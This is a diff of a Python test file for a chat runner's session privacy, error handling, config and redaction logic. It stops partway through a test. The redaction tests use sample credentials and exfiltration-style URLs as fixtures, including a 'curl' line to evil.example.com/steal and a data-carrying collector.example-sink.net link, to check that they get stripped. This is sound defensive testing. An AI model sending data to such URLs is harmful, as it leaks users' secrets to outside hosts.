@@ -39,10 +39,12 @@ from kiro_crew.acp.types import (
     EVENT_COMPLETE,
     EVENT_PERMISSION_REQUEST,
     EVENT_TEXT_CHUNK,
+    EVENT_TOOL_CALL,
     STOP_REASON_COMPACTION_FAILED,
     STOP_REASON_STALE_RECOVER,
     STOP_REASON_TOOL_STALL,
 )
+from kiro_crew.config import live
 from kiro_crew.config.sections import ResolvedBindings
 from kiro_crew.dashboard import chat_runner
 from kiro_crew.dashboard.state import DashboardState, _ChatSlot
@@ -80,6 +82,10 @@ def _state(tmp_path, **kwargs) -> DashboardState:
     # truthy, so every busy-probe would read "turn in flight" on an idle state.
     sessions.get_provider = MagicMock(return_value=None)
     sessions.resumable_sid = MagicMock(return_value=None)
+    # Production answers a plain string, "" when the allocation selected nothing.
+    # Left as a bare MagicMock it would answer a truthy object, which the runner
+    # would store as the slot's requested model and hand to the crew-log emitter.
+    sessions.allocation_requested_model = MagicMock(return_value="")
     sessions.remove = AsyncMock()
     sessions.record_failure = AsyncMock()
     sessions.remove_if_unclaimed = AsyncMock(return_value=False)
@@ -116,6 +122,7 @@ def _permission(
     tool_kind: str = "execute",
     request_id: str = "req-cov-1",
     *,
+    tool_call_id: str | None = None,
     is_shell: bool = True,
     tool_name: str = "",
     mcp_server_name: str = "",
@@ -127,11 +134,35 @@ def _permission(
         tool_kind=tool_kind,
         tool_input=tool_input,
         request_id=request_id,
+        tool_call_id=tool_call_id,
         is_shell=is_shell,
         tool_name=tool_name,
         mcp_server_name=mcp_server_name,
         raw_tool_params=raw_tool_params,
     )
+
+
+def _coding_tool_call(
+    tool_call_id: str = "tc-wt-1",
+    *,
+    tool_kind: str = "edit",
+    tool_name: str = "fs_write",
+    mcp_server_name: str = "",
+) -> LLMEvent:
+    """A coding-shaped tool call."""
+    return LLMEvent(
+        kind=EVENT_TOOL_CALL,
+        title="Writing the file",
+        tool_call_id=tool_call_id,
+        tool_kind=tool_kind,
+        tool_name=tool_name,
+        mcp_server_name=mcp_server_name,
+    )
+
+
+def _statusless_coding_tool_call(tool_call_id: str = "tc-wt-1") -> LLMEvent:
+    """A kiro-cli one-way coding call with no wire status."""
+    return _coding_tool_call(tool_call_id)
 
 
 def _runner_state(tmp_path, *, hook_store=None, context_builder=None):
@@ -141,8 +172,10 @@ def _runner_state(tmp_path, *, hook_store=None, context_builder=None):
     # The provider's sync accessors must NOT be AsyncMock: _run_chat calls them
     # inline and would otherwise store un-awaited coroutines in the WS payload.
     client.context_usage_pct = MagicMock(return_value=0.0)
+    client.context_usage_unknown = MagicMock(return_value=False)
     client.context_window_tokens = MagicMock(return_value=0)
     client.context_used_tokens = MagicMock(return_value=0)
+    client.mcp_session_report = MagicMock(return_value=None)
     client.last_prompt_stats = None
     client._client = client
     client.exit_code = None
@@ -183,7 +216,7 @@ def _quiet_sel():
         yield mock_sel
 
 
-async def _drive(state, slot, message: str = "hello") -> None:
+async def _drive(state, slot, message: str = "hello", *, _turn_actor: str = "") -> None:
     """Run exactly one turn and leave no task behind.
 
     ``_empty_response_retries`` is pre-spent on purpose. A turn that streams no
@@ -195,7 +228,7 @@ async def _drive(state, slot, message: str = "hello") -> None:
     """
     slot._empty_response_retries = 2
     with _quiet_sel():
-        await chat_runner._run_chat(state, slot, message)
+        await chat_runner._run_chat(state, slot, message, _turn_actor=_turn_actor)
     await _settle(slot)
 
 
@@ -215,6 +248,141 @@ async def _settle(slot) -> None:
 
 
 @pytest.mark.asyncio
+async def test_turn_start_folds_temporary_line_over_live_incognito(tmp_path, monkeypatch) -> None:
+    """The metadata privacy ratchet outranks a looser live-first carrier."""
+    from kiro_crew import execution_context
+    from kiro_crew import history as history_mod
+
+    monkeypatch.setattr(history_mod, "_sessions_dir", lambda: tmp_path)
+    state, client = _runner_state(tmp_path)
+    slot = _slot("chat-cov-turn-ratchet")
+    slot.memory_mode = "incognito"
+    state._slots[slot.key] = slot
+    session_key = chat_runner.effective_session_key(slot)
+    live = execution_context.ExecutionContext(
+        None,
+        execution_context.MemoryStoreRef("default"),
+        "template",
+        "kirocrew",
+        "incognito",
+    )
+    execution_context.bind_session_execution(session_key, live)
+    state.conversation_log.update_metadata(session_key, {"memory_mode": "temporary"})
+    assert (
+        execution_context.read_session_execution(session_key) == live
+    ), "the fixture no longer reproduces the live-first premise"
+
+    bindings = ResolvedBindings(
+        workspace_dir=tmp_path,
+        memory_store_name="default",
+        effective_memory_config={},
+        kiro_agent="kirocrew",
+        selection_kind="template",
+    )
+    client.stream = MagicMock(return_value=_async_iter([_complete()]))
+    with patch.object(chat_runner, "resolve_agent_bindings", return_value=bindings):
+        await _drive(state, slot)
+
+    assert slot.memory_mode == "temporary", "the live slot stayed incognito"
+    assert bindings.execution_context is not None
+    assert (
+        bindings.execution_context.memory_mode == "temporary"
+    ), "the turn bindings silently re-opened memory reads"
+    assert (
+        execution_context.read_session_execution(session_key).memory_mode == "temporary"
+    ), "the live carrier was not republished at the line's stricter mode"
+    assert session_key in state._restricted_keys, "the restricted-key marker was not re-derived"
+
+
+def test_turn_start_fold_reads_the_line_by_the_transcript_key(tmp_path, monkeypatch) -> None:
+    """The carrier lives under the SESSION key; the privacy line under the TRANSCRIPT key.
+
+    For an unbound channel-born slot the two differ, so a fold that read the line
+    by the session key found no line and tightened nothing. Given the transcript
+    key, the line's stricter mode folds in.
+    """
+    from kiro_crew import execution_context
+    from kiro_crew.history import ConversationLog
+
+    log = ConversationLog(base_dir=tmp_path / "sessions")
+    log.init()
+    log.update_metadata("dashboard:chat-transcript", {"memory_mode": "temporary"})
+    live = execution_context.ExecutionContext(
+        None, execution_context.MemoryStoreRef("default"), "template", "kirocrew", "incognito"
+    )
+    monkeypatch.setattr(chat_runner, "read_session_execution", lambda _key: live)
+    monkeypatch.setattr(
+        chat_runner,
+        "tighten_live_session_execution",
+        lambda _key, mode, expected=None: live.with_mode(mode),
+    )
+
+    # By the session key alone: no line there, nothing folds.
+    unchanged = chat_runner._read_and_tighten_turn_execution(log, "slack:123")
+    assert unchanged.memory_mode == "incognito"
+    # By the transcript key: the line's stricter mode folds in.
+    folded = chat_runner._read_and_tighten_turn_execution(
+        log, "slack:123", "dashboard:chat-transcript"
+    )
+    assert folded.memory_mode == "temporary"
+
+
+def test_turn_start_fold_without_a_conversation_log_keeps_the_carrier(monkeypatch) -> None:
+    """A state with no transcript store has no line to fold; the carrier stands.
+
+    ``state.conversation_log`` is optional (history disabled, or a state built
+    without one -- every other consumer guards it). The fold must not dereference
+    it: doing so turned every turn into a terminal error card on such a state, and
+    the failure arm then tripped over the same missing store again.
+    """
+    from kiro_crew import execution_context
+
+    live = execution_context.ExecutionContext(
+        None, execution_context.MemoryStoreRef("default"), "template", "kirocrew", "incognito"
+    )
+    monkeypatch.setattr(chat_runner, "read_session_execution", lambda _key: live)
+
+    folded = chat_runner._read_and_tighten_turn_execution(None, "dashboard:no-log")
+
+    assert folded == live
+    assert execution_context.read_live_session_execution("dashboard:no-log") is None
+
+
+def test_turn_start_fold_refuses_the_turn_on_an_unreadable_line(tmp_path, monkeypatch) -> None:
+    """A line that could not be read refuses the turn, retryably; nothing tightens.
+
+    ``get_metadata_status`` answering ``({}, False)`` is a transient read failure,
+    not a mode, and it leaves the turn with no contract to run under. Reading it
+    as Temporary would permanently narrow a persistent chat over one failed read
+    (everything the fold publishes only ever narrows); proceeding on the carrier
+    as read would let a line another writer tightened go unseen for a whole turn
+    with memory still enabled under the looser mode. So the turn defers -- the
+    same answer the save gives on an unreadable line -- and the carrier is left
+    exactly as it was for the next turn's re-read.
+    """
+    from kiro_crew import execution_context
+    from kiro_crew import history as history_mod
+
+    monkeypatch.setattr(history_mod, "_sessions_dir", lambda: tmp_path)
+    session_key = "dashboard:cov-unreadable-line"
+    live = execution_context.ExecutionContext(
+        None, execution_context.MemoryStoreRef("default"), "template", "kirocrew", "persistent"
+    )
+    execution_context.bind_session_execution(session_key, live)
+    assert execution_context.read_session_execution(session_key) == live
+    unreadable_log = MagicMock()
+    unreadable_log.get_metadata_status = MagicMock(return_value=({}, False))
+
+    with pytest.raises(chat_runner._MemoryUnavailable, match="memory_unavailable"):
+        chat_runner._read_and_tighten_turn_execution(unreadable_log, session_key)
+
+    unreadable_log.get_metadata_status.assert_called_once_with(session_key)
+    assert (
+        execution_context.read_session_execution(session_key).memory_mode == "persistent"
+    ), "an unreadable line republished the live carrier at a stricter mode"
+
+
+@pytest.mark.asyncio
 async def test_memory_refusal_preserves_diagnostic_without_initialization_recovery(tmp_path):
     state, _client = _runner_state(tmp_path)
     slot = _slot()
@@ -229,6 +397,25 @@ async def test_memory_refusal_preserves_diagnostic_without_initialization_recove
     assert "recovery" not in error["meta"]
     state.sessions.record_failure.assert_awaited_once()
     state.sessions.get_or_create.assert_not_awaited()
+
+
+@pytest.mark.asyncio
+async def test_changed_member_spec_names_the_capabilities_fix(tmp_path):
+    """A drifted private spec says where to fix it, not a bare machine code."""
+    from kiro_crew.agent_capabilities import CapabilityError
+
+    state, _client = _runner_state(tmp_path)
+    slot = _slot()
+    refusal = CapabilityError("materialization_changed")
+    refusal.member = "reviewer"
+    state.sessions.get_or_create = AsyncMock(side_effect=refusal)
+    await _drive(state, slot)
+
+    error = next(row for row in slot.messages if row["role"] == "error")
+    assert error["content"].startswith("materialization_changed: ")
+    assert "Capabilities" in error["content"]
+    assert error["meta"]["code"] == "materialization_changed"
+    assert error["meta"]["member"] == "reviewer"
 
 
 @pytest.mark.asyncio
@@ -681,28 +868,26 @@ class TestSnapshotHelpers:
         # candidate is tool-inconsistent, so neither hypothesis survives.
         target.write_text("cabab", newline="\n")
 
-        out = chat_runner._reconstruct_str_replace_before(
-            str(target), {"oldStr": "ab", "newStr": "c"}
-        )
+        out = chat_runner._classify_str_replace_before(str(target), {"oldStr": "ab", "newStr": "c"})
 
-        assert out is None
+        assert out == (None, None)
 
     def test_reconstruct_declines_on_replace_all(self, tmp_path):
         target = tmp_path / "all.txt"
         target.write_text("aaa", newline="\n")
 
-        assert (
-            chat_runner._reconstruct_str_replace_before(
-                str(target), {"oldStr": "a", "newStr": "b", "replaceAll": True}
-            )
-            is None
-        )
+        assert chat_runner._classify_str_replace_before(
+            str(target), {"oldStr": "a", "newStr": "b", "replaceAll": True}
+        ) == (None, None)
 
     def test_reconstruct_declines_on_missing_params(self, tmp_path):
         target = tmp_path / "missing.txt"
         target.write_text("body", newline="\n")
 
-        assert chat_runner._reconstruct_str_replace_before(str(target), {"oldStr": "x"}) is None
+        assert chat_runner._classify_str_replace_before(str(target), {"oldStr": "x"}) == (
+            None,
+            None,
+        )
 
     def test_snapshot_write_target_ignores_non_write_commands(self):
         assert chat_runner._snapshot_write_target({"command": "read", "path": "/tmp/x"}) is None
@@ -724,7 +909,12 @@ class TestSnapshotHelpers:
 
         got = chat_runner._snapshot_write_target({"command": "create", "path": str(target)})
 
-        assert got == {"path": str(target), "content": "", "truncated": False}
+        assert got == {
+            "path": str(target),
+            "canonical_path": chat_runner.validate_file_path(str(target)),
+            "content": "",
+            "truncated": False,
+        }
 
 
 class TestFlushFileChanges:
@@ -1192,7 +1382,7 @@ class TestCrossSurfaceReply:
     async def test_empty_text_is_not_mirrored(self, tmp_path):
         state = _state(tmp_path)
 
-        with patch.object(chat_runner, "_resolve_mirror_target") as resolve:
+        with patch.object(chat_runner, "_resolve_channel_target") as resolve:
             await chat_runner._deliver_cross_surface_reply(state, "dashboard:x", "")
 
         resolve.assert_not_called()
@@ -1208,7 +1398,7 @@ class TestCrossSurfaceReply:
         transport.capabilities.max_message_bytes = 0
         link = MagicMock(channel_id="123", thread_id=None, channel_type="telegram")
 
-        with patch.object(chat_runner, "_resolve_mirror_target", return_value=(link, transport)):
+        with patch.object(chat_runner, "_resolve_channel_target", return_value=(link, transport)):
             await chat_runner._deliver_cross_surface_reply(state, "dashboard:x", "ab " * 20)
 
         assert transport.send_message.await_count > 1
@@ -1222,7 +1412,7 @@ class TestCrossSurfaceReply:
         transport.send_message.side_effect = RuntimeError("offline")
         link = MagicMock(channel_id="123", thread_id=None, channel_type="telegram")
 
-        with patch.object(chat_runner, "_resolve_mirror_target", return_value=(link, transport)):
+        with patch.object(chat_runner, "_resolve_channel_target", return_value=(link, transport)):
             await chat_runner._deliver_cross_surface_reply(state, "dashboard:x", "hello")
 
 
@@ -1269,13 +1459,9 @@ class TestFlushSegment:
         assert len(assistants) == 1, f"expected one assistant row, got {slot.messages}"
         assert "AKIAIOSFODNN7EXAMPLE" not in assistants[0]["content"]
 
-    def test_a_redacted_connection_string_warns_the_user(self, tmp_path):
-        """The corruption must not be silent.
-
-        Uses the reporter's exact command. The assistant row keeps the mangled
-        text (redaction is not weakened), but a notice row now follows it saying
-        so and warning that the command will not run as pasted.
-        """
+    def test_a_redacted_credential_is_described_not_noticed(self, tmp_path):
+        """The lock tag replaces the grey notice: the row carries one record per
+        placeholder and no notice row is appended."""
         from kiro_crew.security import REDACTED_CREDENTIAL_TAG
 
         state, slot = _state(tmp_path), _slot()
@@ -1283,86 +1469,49 @@ class TestFlushSegment:
 
         chat_runner._flush_segment(state, slot, command)
 
-        roles = [m.get("role") for m in slot.messages]
-        assert roles == ["assistant", "notice"]
-        assistant, notice = slot.messages[0], slot.messages[1]
-        # Redaction still happened -- the credential is gone from what is stored.
+        assert [m.get("role") for m in slot.messages] == ["assistant"]
+        assistant = slot.messages[0]
         assert "user:pass" not in assistant["content"]
         assert REDACTED_CREDENTIAL_TAG in assistant["content"]
-        # ...and the user is now told, including that it will not run as pasted.
-        assert "Security notice" in notice["content"]
-        assert "will not work if you paste it as-is" in notice["content"]
-        assert notice["cls"] == "msg msg-info"
-        # The notice must never carry the secret it is reporting on.
-        assert "user:pass" not in notice["content"]
+        records = assistant["meta"]["redactions"]
+        assert [(r["ordinal"], r["rule"]) for r in records] == [(0, "url_userinfo")]
+        assert "user:pass" not in json.dumps(records)
 
-    def test_the_notice_counts_multiple_credentials(self, tmp_path):
+    def test_every_placeholder_gets_a_record_in_order(self, tmp_path):
         state, slot = _state(tmp_path), _slot()
 
         chat_runner._flush_segment(
-            state,
-            slot,
-            "first postgresql://a:b@h1/db then mysql://c:d@h2/db",
+            state, slot, "first postgresql://a:b@h1/db then mysql://c:d@h2/db"
         )
 
-        # Assert on the collected rows rather than `next(...)`: a bare `next` over a
-        # generator raises StopIteration when the row is missing, and a raise cannot
-        # distinguish "no notice was appended" from "_flush_segment threw before
-        # appending one". An assertion on the list says which.
-        notices = [m for m in slot.messages if m.get("role") == "notice"]
-        assert len(notices) == 1, f"expected exactly one notice row, got {notices}"
-        assert "2 credentials" in notices[0]["content"]
-        assert "were replaced" in notices[0]["content"]
+        records = slot.messages[0]["meta"]["redactions"]
+        assert [r["ordinal"] for r in records] == [0, 1]
 
-    def test_a_clean_segment_gets_no_notice(self, tmp_path):
+    def test_a_clean_segment_gets_no_notice_and_no_records(self, tmp_path):
         state, slot = _state(tmp_path), _slot()
 
         chat_runner._flush_segment(state, slot, "here is a plain answer")
 
         assert [m.get("role") for m in slot.messages] == ["assistant"]
+        assert "redactions" not in (slot.messages[0].get("meta") or {})
 
-    def test_an_encoded_credential_also_warns(self, tmp_path):
-        """A base64-encoded credential is redacted by a DIFFERENT pass and tag.
-
-        `redact_credentials` pass 2 substitutes `[REDACTED: encoded credential]`,
-        which is not a substring of the plaintext tag. Counting only the plaintext
-        tag left this segment silently rewritten -- the same failure, just
-        reached by another pass.
-        """
+    def test_an_encoded_credential_is_described(self, tmp_path):
         import base64
 
-        from kiro_crew.security import (
-            _REDACTED_ENCODED_CREDENTIAL_TAG,
-            REDACTED_CREDENTIAL_TAG,
-        )
+        from kiro_crew.security import _REDACTED_ENCODED_CREDENTIAL_TAG
 
         state, slot = _state(tmp_path), _slot()
-        # The issue's own connection string, base64-encoded.
         blob = base64.b64encode(b"postgresql://user:pass@host:5432/db").decode()
 
         chat_runner._flush_segment(state, slot, f"decode this: {blob}")
 
-        # Assert on collected rows, not `next(...)`. The roles list is also the
-        # witness that `_flush_segment` RAN to completion: if it had thrown before
-        # appending, there would be no assistant row either, so a missing notice
-        # beside a present assistant row isolates the count as the cause.
-        roles = [m.get("role") for m in slot.messages]
-        assert roles == ["assistant", "notice"], f"unexpected rows: {roles}"
-        assistant, notice = slot.messages[0], slot.messages[1]
-        # Redacted by pass 2, so ONLY the encoded tag is present.
+        assistant = slot.messages[0]
         assert _REDACTED_ENCODED_CREDENTIAL_TAG in assistant["content"]
-        assert REDACTED_CREDENTIAL_TAG not in assistant["content"]
-        assert "A credential" in notice["content"]
-        assert "will not work if you paste it as-is" in notice["content"]
+        assert [r["rule"] for r in assistant["meta"]["redactions"]] == ["encoded_credential"]
 
     def test_the_two_credential_tags_do_not_overlap(self):
-        """Summing per-tag counts must not double-count one substitution.
-
-        `_flush_segment` adds `redacted.count(tag)` across every tag in
-        `CREDENTIAL_REDACTION_TAGS`. That is only safe while no tag contains
-        another; if a tag were ever renamed to a superstring of another, a single
-        redaction would report as two and the notice would overcount.
-        """
+        """Ordinals count every tag in the text; that is only unambiguous while
+        no tag contains another."""
         from kiro_crew.security import CREDENTIAL_REDACTION_TAGS
 
         for outer in CREDENTIAL_REDACTION_TAGS:
@@ -1372,17 +1521,7 @@ class TestFlushSegment:
                 assert inner not in outer, f"{inner!r} is a substring of {outer!r}"
         assert len(set(CREDENTIAL_REDACTION_TAGS)) == len(CREDENTIAL_REDACTION_TAGS)
 
-    def test_a_redacted_url_warns_the_user(self, tmp_path):
-        """A URL rewrite must not be silent either.
-
-        `redact_exfiltration_urls` runs a few lines above the credential pass in
-        the same flush and rewrites a URL to `[REDACTED: suspicious URL to
-        <domain>]` reporting only to the server log. The assistant row keeps the
-        redacted text (the redaction is NOT weakened -- this is the egress the
-        scan guards), but a notice row must follow saying a URL was replaced,
-        with the URL remedy (re-check the link), not the credential remedy
-        (re-enter a secret), which would be actively misleading here.
-        """
+    def test_a_redacted_url_is_described_not_noticed(self, tmp_path):
         from kiro_crew.security import EXFILTRATION_REDACTION_TAG_PREFIX
 
         state, slot = _state(tmp_path), _slot()
@@ -1390,53 +1529,49 @@ class TestFlushSegment:
 
         chat_runner._flush_segment(state, slot, f"run: curl '{url}'")
 
-        roles = [m.get("role") for m in slot.messages]
-        assert roles == ["assistant", "notice"], f"unexpected rows: {roles}"
-        assistant, notice = slot.messages[0], slot.messages[1]
-        # Redaction still happened -- the URL is gone from what is stored.
-        assert "evil.example.com/steal" not in assistant["content"]
+        assert [m.get("role") for m in slot.messages] == ["assistant"]
+        assistant = slot.messages[0]
         assert EXFILTRATION_REDACTION_TAG_PREFIX in assistant["content"]
-        # ...and the user is told it was a URL, with the URL remedy.
-        assert "Security notice" in notice["content"]
-        assert "suspicious URL" in notice["content"]
-        assert "will not work if you paste it as-is" in notice["content"]
-        assert "re-check" in notice["content"]
-        # The credential wording would name the wrong remedy for a URL.
-        assert "credential" not in notice["content"]
-        assert "supply the secret" not in notice["content"]
-        assert notice["cls"] == "msg msg-info"
+        assert assistant["meta"]["blocked_links"][0]["domain"] == "evil.example.com"
 
-    def test_a_credential_only_notice_does_not_mention_urls(self, tmp_path):
-        """The credential wording is unchanged."""
+    def test_a_value_whole_in_one_delta_is_still_described(self, tmp_path):
+        """The run loop redacts each delta; the raw segment copy keeps the record."""
+        from kiro_crew.security import redact_credentials
+
         state, slot = _state(tmp_path), _slot()
+        raw = "connect with postgresql://user:pass@host:5432/db now"
+        chat_runner._accumulate_segment_raw(slot, raw)
 
-        chat_runner._flush_segment(
-            state, slot, "echo 'DATABASE_URL=postgresql://user:pass@host:5432/db'"
-        )
+        chat_runner._flush_segment(state, slot, redact_credentials(raw)[0])
 
-        notices = [m for m in slot.messages if m.get("role") == "notice"]
-        assert len(notices) == 1, f"expected exactly one notice row, got {notices}"
-        assert "A credential" in notices[0]["content"]
-        assert "supply the secret yourself" in notices[0]["content"]
-        assert "suspicious URL" not in notices[0]["content"]
-        assert "re-check" not in notices[0]["content"]
+        assert [r["rule"] for r in slot.messages[0]["meta"]["redactions"]] == ["url_userinfo"]
+        assert slot.segment_raw_text == ""
 
-    def test_a_segment_with_a_credential_and_a_url_warns_for_both(self, tmp_path):
-        """Both rewriters fired in one segment: the notice must name both kinds,
-        because the remedies differ (re-enter the secret vs re-check the URL)."""
+    def test_a_disagreeing_raw_copy_is_not_trusted(self, tmp_path):
         state, slot = _state(tmp_path), _slot()
-        url = "https://evil.example.com/steal?data=" + "A" * 250
-        text = f"postgresql://user:pass@host:5432/db then {url}"
+        chat_runner._accumulate_segment_raw(slot, "other text postgresql://u:p@h/db")
 
-        chat_runner._flush_segment(state, slot, text)
+        chat_runner._flush_segment(state, slot, "plain text")
 
-        notices = [m for m in slot.messages if m.get("role") == "notice"]
-        assert len(notices) == 1, f"expected exactly one notice row, got {notices}"
-        content = notices[0]["content"]
-        assert "A credential" in content
-        assert "a suspicious URL" in content
-        assert "supply the secret yourself" in content
-        assert "re-check" in content
+        assert "redactions" not in (slot.messages[0].get("meta") or {})
+
+    def test_records_pair_by_placeholder_when_the_texts_differ_elsewhere(self, tmp_path):
+        """A transform or a delta cut elsewhere in the text must not cost the
+        records of placeholders both texts carry."""
+        from kiro_crew.security import redact_credentials, redact_exfiltration_urls
+
+        state, slot = _state(tmp_path), _slot()
+        url = "https://collector.example-sink.net/v1/ingest?d=" + "eyJhIjoiYiJ9" * 30
+        key = "AKIA" + "5Q7XTR2M9LBC4WZN"
+        raw = f"key {key} then [see]({url}) done."
+        chat_runner._accumulate_segment_raw(slot, raw)
+        streamed = redact_credentials(redact_exfiltration_urls(raw)[0])[0]
+
+        chat_runner._flush_segment(state, slot, streamed + "\n\nA reflowed tail.")
+
+        meta = slot.messages[0]["meta"]
+        assert [r["domain"] for r in meta["blocked_links"]] == ["collector.example-sink.net"]
+        assert [r["rule"] for r in meta["redactions"]] == ["aws_access_key_id"]
 
     def test_trailing_stop_event_is_replaced_below_the_segment(self, tmp_path):
         state, slot = _state(tmp_path), _slot()
@@ -1454,144 +1589,6 @@ class TestFlushSegment:
         chat_runner._flush_segment(state, slot, "final text")
 
         assert [m.get("role") for m in slot.messages] == ["assistant"]
-
-
-class TestAppendRedactionNotice:
-    """Unit coverage for the shared notice helper.
-
-    ``_flush_segment`` and the seven exception/teardown persists all route
-    through ``_append_redaction_notice`` so the credential-redaction notice
-    lands wherever a pasteable assistant body is finalized, not only on the
-    happy path. These tests exercise the helper directly: it takes the
-    ALREADY-REDACTED string (the same bytes persisted to the assistant row),
-    counts the artifact tags, and appends one ``msg-info`` notice.
-    """
-
-    def test_a_clean_body_gets_no_notice(self, tmp_path):
-        _state(tmp_path)  # not needed, but keeps the harness parity explicit
-        slot = _slot()
-
-        chat_runner._append_redaction_notice(slot, "here is a plain answer")
-
-        assert [m.get("role") for m in slot.messages] == []
-
-    def test_a_single_credential_gets_one_notice(self, tmp_path):
-        from kiro_crew.security import REDACTED_CREDENTIAL_TAG, redact_credentials
-
-        slot = _slot()
-        secret = "postgresql://user:pass@host:5432/db"
-        redacted, _ = redact_credentials(f"connect with {secret}")
-
-        chat_runner._append_redaction_notice(slot, redacted)
-
-        notices = [m for m in slot.messages if m.get("role") == "notice"]
-        assert len(notices) == 1, f"expected one notice row, got {slot.messages}"
-        assert notices[0]["cls"] == "msg msg-info"
-        assert "Security notice" in notices[0]["content"]
-        assert "will not work if you paste it as-is" in notices[0]["content"]
-        # The notice must never carry the secret it is reporting on.
-        assert "user:pass" not in notices[0]["content"]
-        # Coherence check: the tag the count reads is genuinely present in the body.
-        assert REDACTED_CREDENTIAL_TAG in redacted
-
-    def test_multiple_credentials_are_counted(self, tmp_path):
-        from kiro_crew.security import redact_credentials
-
-        slot = _slot()
-        redacted, _ = redact_credentials("first postgresql://a:b@h1/db then mysql://c:d@h2/db")
-
-        chat_runner._append_redaction_notice(slot, redacted)
-
-        notices = [m for m in slot.messages if m.get("role") == "notice"]
-        assert len(notices) == 1, f"expected exactly one notice row, got {notices}"
-        assert "2 credentials" in notices[0]["content"]
-        assert "were replaced" in notices[0]["content"]
-
-    def test_an_encoded_credential_tag_is_counted(self, tmp_path):
-        """A base64-encoded credential is redacted by a DIFFERENT pass and tag.
-
-        Counting only the plaintext tag would leave this silently rewritten --
-        the same failure, reached by another pass. The helper reads
-        ``CREDENTIAL_REDACTION_TAGS`` so a newly added tag cannot escape.
-        """
-        import base64
-
-        from kiro_crew.security import (
-            _REDACTED_ENCODED_CREDENTIAL_TAG,
-            REDACTED_CREDENTIAL_TAG,
-            redact_credentials,
-        )
-
-        slot = _slot()
-        blob = base64.b64encode(b"postgresql://user:pass@host:5432/db").decode()
-        redacted, _ = redact_credentials(f"decode this: {blob}")
-
-        chat_runner._append_redaction_notice(slot, redacted)
-
-        # Redacted by pass 2, so ONLY the encoded tag is present.
-        assert _REDACTED_ENCODED_CREDENTIAL_TAG in redacted
-        assert REDACTED_CREDENTIAL_TAG not in redacted
-        notices = [m for m in slot.messages if m.get("role") == "notice"]
-        assert len(notices) == 1, f"expected one notice row, got {slot.messages}"
-        assert "A credential" in notices[0]["content"]
-
-
-class TestExceptionPathRedactionNotice:
-    """The notice must fire on the exception/teardown persists too.
-
-    Seven branches finalize a pasteable assistant body directly via
-    ``slot.append("assistant", <redacted>, "msg msg-a")`` and bypass
-    ``_flush_segment``. This drives a real ``AcpProcessDied`` turn (the same
-    scripted-provider harness the recovery-ladder tests use) with a credential
-    in the streamed text and asserts the notice now lands immediately after the
-    assistant row and BEFORE the subsequent retry/error card. It fails if the
-    ``_append_redaction_notice`` call is removed from that branch, which is the
-    mutation guard the issue asks for.
-    """
-
-    @pytest.mark.asyncio
-    async def test_process_death_persist_warns_about_a_redacted_credential(self, tmp_path):
-        from kiro_crew.acp.client import AcpProcessDied
-        from kiro_crew.security import REDACTED_CREDENTIAL_TAG
-
-        state, client = _runner_state(tmp_path)
-        slot = _slot()
-
-        # Stream a credential-bearing chunk, then die: assistant_text is non-empty
-        # so the AcpProcessDied branch persists the (redacted) partial and, with
-        # this fix, appends the notice.
-        def _stream(*_args, **_kwargs):
-            async def _gen():
-                yield LLMEvent(
-                    kind=EVENT_TEXT_CHUNK,
-                    text="run: psql postgresql://user:pass@host:5432/db",
-                )
-                raise AcpProcessDied("process exited")
-
-            return _gen()
-
-        client.stream = MagicMock(side_effect=_stream)
-
-        await _drive(state, slot)
-
-        roles = [m.get("role") for m in slot.messages]
-        assert "assistant" in roles, f"no assistant row persisted: {slot.messages}"
-        assistant = next(m for m in slot.messages if m.get("role") == "assistant")
-        notice = next((m for m in slot.messages if m.get("role") == "notice"), None)
-        # Redaction still happened on the exception path.
-        assert "user:pass" not in assistant["content"]
-        assert REDACTED_CREDENTIAL_TAG in assistant["content"]
-        # ...and the notice now fires (this is what regresses if the helper call
-        # is removed from the AcpProcessDied branch).
-        assert notice is not None, f"expected a redaction notice row, got {roles}"
-        assert notice["cls"] == "msg msg-info"
-        assert "Security notice" in notice["content"]
-        assert "user:pass" not in notice["content"]
-        # Ordering: notice sits between the assistant body and the retry/error
-        # card, mirroring _flush_segment (notice immediately follows its message).
-        assert roles.index("notice") == roles.index("assistant") + 1
-        assert "error" in roles, f"expected a retry/error card after the notice: {roles}"
-        assert roles.index("notice") < roles.index("error")
 
 
 class TestScheduleWidgetRegistration:
@@ -2351,30 +2348,38 @@ class TestConsumePendingDiscardWaitsForSubagents:
 
 
 class TestScheduleEagerSpawn:
+    @staticmethod
+    def _prime(enabled: bool) -> None:
+        """Adopt a config carrying *enabled* on the process config watcher.
+
+        The gate reads ``session.eager_spawn`` from the watcher's snapshot, a
+        plain attribute read, because it runs on the event loop. The autouse
+        watcher reset in ``test/conftest.py`` clears this after every test.
+        """
+        cfg = chat_runner.KiroCrewConfig()
+        cfg.session.eager_spawn = enabled
+        live.watch().prime(cfg)
+
     def test_disabled_config_returns_no_task(self, tmp_path):
         state, slot = _state(tmp_path), _slot()
-        cfg = MagicMock()
-        cfg.session.eager_spawn = False
+        self._prime(False)
 
-        with patch.object(chat_runner.KiroCrewConfig, "load", return_value=cfg):
-            assert chat_runner.schedule_eager_spawn(state, slot) is None
+        assert chat_runner.schedule_eager_spawn(state, slot) is None
 
-    def test_config_load_failure_returns_no_task(self, tmp_path):
+    def test_config_read_failure_returns_no_task(self, monkeypatch, tmp_path):
+        """A failed read is swallowed: a speculative pre-warm must not raise
+        into a slot-signal handler, which has a frame to answer."""
         state, slot = _state(tmp_path), _slot()
+        monkeypatch.setattr(live, "snapshot", MagicMock(side_effect=RuntimeError("bad toml")))
 
-        with patch.object(chat_runner.KiroCrewConfig, "load", side_effect=RuntimeError("bad toml")):
-            assert chat_runner.schedule_eager_spawn(state, slot) is None
+        assert chat_runner.schedule_eager_spawn(state, slot) is None
 
     @pytest.mark.asyncio
     async def test_a_newer_signal_cancels_the_pending_task(self, tmp_path):
         state, slot = _state(tmp_path), _slot()
-        cfg = MagicMock()
-        cfg.session.eager_spawn = True
+        self._prime(True)
 
-        with (
-            patch.object(chat_runner.KiroCrewConfig, "load", return_value=cfg),
-            patch.object(chat_runner, "_eager_spawn", new=AsyncMock()),
-        ):
+        with patch.object(chat_runner, "_eager_spawn", new=AsyncMock()):
             first = chat_runner.schedule_eager_spawn(state, slot)
             second = chat_runner.schedule_eager_spawn(state, slot)
             await asyncio.sleep(0)
@@ -2516,6 +2521,53 @@ class TestSteerLifecycle:
         # and this call site must not select anything else.
         assert settle.call_args.kwargs == {}
 
+    def test_a_settled_steer_drops_its_possibly_delivered_mark(self):
+        """A steer the turn consumed is settled: a later identical text must not
+        inherit the possibly-delivered note."""
+        slot = _slot()
+        slot._pending_steers = ["a"]
+        slot._steer_possibly_delivered = {"a"}
+
